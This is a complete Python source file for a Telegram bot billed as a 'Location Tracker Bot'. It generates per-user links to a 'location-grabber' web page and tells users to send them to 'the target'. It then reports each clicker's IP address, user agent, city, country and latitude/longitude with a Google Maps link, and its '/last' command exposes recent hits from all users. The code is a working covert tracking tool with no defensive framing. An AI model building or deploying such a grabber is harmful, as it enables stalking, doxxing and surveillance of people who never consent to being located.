import os
from datetime import datetime

from dotenv import load_dotenv
from pymongo import MongoClient
import telebot
from telebot import types

# ===========================
# Config / Env
# ===========================
load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")
DB_NAME = os.getenv("DB_NAME") or "locations"

if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN missing from .env")
if not MONGO_URI:
    raise RuntimeError("MONGO_URI missing from .env")

# Frontend URL (HTML page), not API
VERCEL_BASE_URL = os.getenv(
    "VERCEL_BASE_URL",
    "https://location-grabber-zeta.vercel.app/"
)

bot = telebot.TeleBot(BOT_TOKEN)
mongo = MongoClient(MONGO_URI)
db = mongo[DB_NAME]

# locations collection
CLICK_COLLECTION = db["locations"]

# Channel config
CHANNEL_USERNAME = "@Cy3erT3ch"
CHANNEL_LINK = "https://t.me/Cy3erT3ch"

# ===========================
# Helpers
# ===========================
def format_hit(h):
    ts = h.get("ts")
    if isinstance(ts, datetime):
        ts_str = ts.strftime("%Y-%m-%d %H:%M:%S")
    else:
        ts_str = str(ts)

    ip = h.get("ip", "?")
    ua = h.get("ua", h.get("userAgent", "?"))

    country = (
        h.get("country")
        or h.get("geo", {}).get("country")
        or "?"
    )
    city = (
        h.get("city")
        or h.get("geo", {}).get("city")
        or "?"
    )

    # Align these keys with your MongoDB documents
    lat = (
        h.get("lat")
        or h.get("latitude")
        or h.get("geo", {}).get("lat")
        or h.get("geo", {}).get("latitude")
    )
    lon = (
        h.get("lon")
        or h.get("lng")
        or h.get("longitude")
        or h.get("geo", {}).get("lon")
        or h.get("geo", {}).get("lng")
        or h.get("geo", {}).get("longitude")
    )

    # String cleanup
    if isinstance(lat, str):
        lat = lat.strip()
    if isinstance(lon, str):
        lon = lon.strip()

    path = h.get("path", "")

    text = (
        f"Time: {ts_str}\n"
        f"IP: {ip}\n"
        f"UA: {ua}\n"
        f"Country: {country}\n"
        f"City: {city}\n"
        f"Path: {path}\n"
    )

    if lat and lon:
        text += f"Lat: {lat}\nLon: {lon}\n"
        text += f"Map: https://www.google.com/maps?q={lat},{lon}\n"

    return text

# ===========================
# /start – show join UI
# ===========================
@bot.message_handler(commands=["start"])
def start(msg):
    chat_id = msg.chat.id

    text = (
        "Welcome to Location Tracker Bot.\n\n"
        "To use this bot, please subscribe to our channel first:\n"
        f"Channel: {CHANNEL_USERNAME}\n"
        f"Link: {CHANNEL_LINK}\n\n"
        "After subscribing, press the '✅ I Joined' button below."
    )

    kb = types.InlineKeyboardMarkup()
    join_btn = types.InlineKeyboardButton(
        text="📢 Join Channel",
        url=CHANNEL_LINK
    )
    confirm_btn = types.InlineKeyboardButton(
        text="✅ I Joined",
        callback_data="joined_channel"
    )
    kb.add(join_btn)
    kb.add(confirm_btn)

    bot.send_message(chat_id, text, reply_markup=kb)

# ===========================
# Callback – user says “I joined”
# ===========================
@bot.callback_query_handler(func=lambda c: c.data == "joined_channel")
def handle_joined_channel(callback_query):
    chat_id = callback_query.message.chat.id

    text = (
        "Thank you for subscribing to the channel!\n\n"
        "You can now use the bot with these commands:\n"
        "/location_tracker - Get your private tracking link\n"
        "/result - See results for your link\n"
        "/last - Global last 5 hits\n"
        "/help - Detailed instructions\n"
    )

    bot.answer_callback_query(callback_query.id, "You can now use the bot.")
    bot.send_message(chat_id, text)

# ===========================
# /help
# ===========================
@bot.message_handler(commands=["help"])
def help_cmd(msg):
    chat_id = msg.chat.id

    text = (
        "🛰 *Location Tracker Bot Help*\n\n"
        "1️⃣ Start:\n"
        "   - `/start` → Shows how to subscribe and use the bot.\n\n"
        "2️⃣ /location_tracker:\n"
        "   - Creates a *private* tracking link.\n"
        "   - The generated link is *unique* and is bound to your chat ID.\n"
        "   - No other user can see your results.\n\n"
        "3️⃣ Sharing the link:\n"
        "   - Send the generated link to the target.\n"
        "   - Whenever someone clicks the link, their IP/geo data\n"
        "     is stored in the `locations` collection.\n\n"
        "4️⃣ View your results:\n"
        "   - Send `/result`.\n"
        "   - The bot counts only entries for your link and shows\n"
        "     the latest hits.\n\n"
        "5️⃣ Global log (optional):\n"
        "   - `/last` → Shows the last 5 hits for all users combined.\n\n"
        "🔐 Privacy:\n"
        "   - Each link is tied to the user's Telegram chat ID.\n"
        "   - `/result` only shows data for your own link.\n"
    )

    bot.send_message(chat_id, text, parse_mode="Markdown")

# ===========================
# /location_tracker
# ===========================
@bot.message_handler(commands=["location_tracker"])
def location_tracker(msg):
    chat_id = msg.chat.id

    # Per-user unique link
    tracking_url = f"{VERCEL_BASE_URL}?uid={chat_id}"

    text = (
        "Your private tracking link:\n\n"
        f"{tracking_url}\n\n"
        "Note:\n"
        "- Share this link with the target.\n"
        "- Anyone who clicks this link will be logged and visible\n"
        "  only in your `/result` command.\n"
        "- No other user can see your results.\n"
    )

    bot.send_message(chat_id, text)

# ===========================
# /result  (per-user privacy)
# ===========================
@bot.message_handler(commands=["result"])
def result_cmd(msg):
    chat_id = msg.chat.id

    query = {"owner_id": str(chat_id)}
    total = CLICK_COLLECTION.count_documents(query)

    if total == 0:
        bot.reply_to(
            msg,
            "No clicks recorded for your link yet."
        )
        return

    hits = list(
        CLICK_COLLECTION.find(query)
        .sort("ts", -1)
        .limit(5)
    )

    lines = [format_hit(h) for h in hits]

    text = (
        "📊 *Results for your link*\n"
        f"Total clicks: {total}\n\n"
        + "\n-----------------\n\n".join(lines)
    )

    bot.reply_to(msg, text, parse_mode="Markdown")

# ===========================
# /last  (global)
# ===========================
@bot.message_handler(commands=["last"])
def last_hits(msg):
    hits = list(
        CLICK_COLLECTION.find().sort("ts", -1).limit(5)
    )

    if not hits:
        bot.reply_to(msg, "No click data found yet.")
        return

    lines = [format_hit(h) for h in hits]

    bot.reply_to(msg, "\n-----------------\n\n".join(lines))

# ===========================
# Fallback
# ===========================
@bot.message_handler(func=lambda m: True)
def fallback(msg):
    bot.reply_to(
        msg,
        "Use /start to see how to subscribe and use the bot.\n"
        "Use /help for detailed instructions.\n"
    )

# ===========================
# Entry
# ===========================
if __name__ == "__main__":
    print("Bot running...")
    bot.infinity_polling()
